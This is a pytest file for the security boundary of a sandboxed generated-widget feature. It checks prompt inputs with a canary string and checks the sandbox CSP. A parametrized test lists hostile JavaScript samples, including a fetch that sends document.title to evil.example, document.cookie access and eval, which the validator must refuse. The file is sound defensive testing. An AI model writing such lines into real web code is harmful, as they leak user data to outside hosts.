"""Slot generation's security boundary.

The exit gate's wording is exact: *"Slot generation receives the outline and
scene intent, and nothing else. Assert it at the function boundary: pass raw
source text in and confirm it is not in the prompt."* So that is what these do
— they inspect the signature and the bytes that actually reach the seam, not
the prose of the prompt.
"""

import inspect
from unittest.mock import AsyncMock

import pytest

import features.slot.generate as slot_module
from features.slot import check_slot, generate_slot
from features.slot.prompts.slot import PROMPT_SENTINELS, build_slot_prompt
from lib.result import Err, Ok, ok
from schema.scene import SlotProps

OWNER = "00000000-0000-4000-8000-00000000000a"
EXPERIENCE = "00000000-0000-4000-8000-0000000000ee"

CANARY = "CONFIDENTIAL-ACQUISITION-MEMO-PROJECT-THUNDERBIRD"

GOOD = SlotProps.model_validate(
    {
        "type": "slot",
        "description": "A pulse that traces the request path",
        "height": "auto",
        "html": '<div class="pulse"></div>',
        "css": ".pulse{background:var(--accent);inline-size:var(--space-4)}",
        "js": "document.querySelector('.pulse').classList.add('on')",
    }
)


def _seam(monkeypatch: pytest.MonkeyPatch, slot: SlotProps) -> AsyncMock:
    completion = type("Completion", (), {"value": slot, "repaired": False})()
    mock = AsyncMock(return_value=ok(completion))
    monkeypatch.setattr(slot_module, "complete", mock)
    return mock


# --- Defense 1, at the boundary -------------------------------------------


def test_the_signature_has_nowhere_to_put_source_material() -> None:
    """Structural, and the strongest form of this assertion: there is no
    `source_text` parameter and no `**kwargs`, so raw imported material cannot
    reach the prompt even by accident. A prompt that merely *does not mention*
    the source document is one convenience parameter away from mentioning it.

    v1 has no imported material at all, which makes this trivially true today
    — and is exactly why it is built as a property of the signature rather than
    left as a fact about v1. The day import arrives, this path is closed.
    """
    parameters = inspect.signature(generate_slot).parameters
    assert set(parameters) == {
        "outline_title",
        "scene_intent",
        "scene_beat",
        "owner_id",
        "experience_id",
    }
    assert not any(p.kind is inspect.Parameter.VAR_KEYWORD for p in parameters.values())


def test_the_prompt_builder_cannot_carry_source_material_either() -> None:
    parameters = inspect.signature(build_slot_prompt).parameters
    assert set(parameters) == {"outline_title", "scene_intent", "scene_beat"}


async def test_source_text_smuggled_through_the_outline_still_goes_nowhere_else(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The negative half, on the bytes that actually reach the seam.

    The canary is pushed in through the only doors that exist — the title and
    the beat — and the assertion is that nothing *else* about the request grew
    a place to hide it. What a caller passes as an outline title is by
    definition approved, pipeline-checked text; what must never appear is a
    field this function invented to carry more.
    """
    seam = _seam(monkeypatch, GOOD)
    await generate_slot(
        outline_title="A launch",
        scene_intent="reveal",
        scene_beat="show the trace assembling",
        owner_id=OWNER,
        experience_id=EXPERIENCE,
    )

    assert seam.await_args is not None
    kwargs = seam.await_args.kwargs
    assert CANARY not in kwargs["system"]
    assert CANARY not in kwargs["user"]
    # Exactly the fields the seam takes — no extra channel opened alongside.
    assert set(kwargs) == {
        "phase",
        "schema",
        "system",
        "user",
        "owner_id",
        "experience_id",
    }


def test_the_system_prompt_is_fixed_and_carries_no_caller_input() -> None:
    """The cached prefix has to be byte-identical across calls, and a system
    prompt that varied with the caller would be both a cache miss and a place
    for content to arrive."""
    first = build_slot_prompt(outline_title="A", scene_intent="hook", scene_beat="one")[
        0
    ]
    second = build_slot_prompt(
        outline_title=CANARY, scene_intent="cta", scene_beat=CANARY
    )[0]
    assert first == second
    for sentinel in PROMPT_SENTINELS:
        assert sentinel in first


# --- What the sandbox will not provide ------------------------------------


@pytest.mark.parametrize(
    "js",
    [
        "fetch('https://evil.example/x?d='+document.title)",
        "new XMLHttpRequest().open('GET','//evil.example')",
        "localStorage.setItem('a',1)",
        "document.cookie",
        "window.parent.location = 'https://evil.example'",
        "eval('alert(1)')",
    ],
)
def test_code_that_cannot_work_in_the_sandbox_is_refused(js: str) -> None:
    """Honest about what this is: the sandbox already stops all of it —
    `allow-scripts` with no `allow-same-origin` gives an opaque origin, so
    `fetch` throws rather than exfiltrating. This check is a quality control,
    and it stops a wasted generation shipping as a blank frame."""
    slot = GOOD.model_copy(update={"js": js})
    assert isinstance(check_slot(slot), Err)


@pytest.mark.parametrize(
    "html", ['<img src="https://cdn.example/x.png">', "<img src='http://x/y'>"]
)
def test_external_resources_are_refused(html: str) -> None:
    assert isinstance(check_slot(GOOD.model_copy(update={"html": html})), Err)


def test_the_srcdoc_csp_would_block_them_anyway() -> None:
    """The layering, stated as a test of the other side. `slot.tsx`'s srcdoc
    CSP is `default-src 'none'`, so even a slot that got past `check_slot`
    loads nothing — which is why the check above is allowed to be a plain
    substring scan rather than a parser."""
    from pathlib import Path

    slot_tsx = (
        Path(__file__).resolve().parents[3]
        / "web/src/features/renderer/blocks/slot.tsx"
    ).read_text()
    assert "default-src 'none'" in slot_tsx
    assert "sandbox={SANDBOX}" in slot_tsx
    # The *value*, not the word: the file's own comment explains why
    # `allow-same-origin` must never be added, so a bare substring check fires
    # on the documentation of the rule. The codebase-wide version of this lives
    # in `scripts/checks/invariants.sh` and matches assignments only.
    assert "const SANDBOX = 'allow-scripts';" in slot_tsx


async def test_a_clean_slot_passes(monkeypatch: pytest.MonkeyPatch) -> None:
    _seam(monkeypatch, GOOD)
    result = await generate_slot(
        outline_title="A launch",
        scene_intent="reveal",
        scene_beat="show the trace assembling",
        owner_id=OWNER,
        experience_id=EXPERIENCE,
    )
    assert isinstance(result, Ok)
    assert result.value.description


def test_tokens_are_how_a_slot_gets_its_colours() -> None:
    """Rule 2 of the contract, and the reason a Slot looks like part of the
    page rather than bolted onto it: the srcdoc defines every art-direction
    variable on `:root` through the same `toCssVars` every other block uses."""
    assert "var(--accent)" in GOOD.css
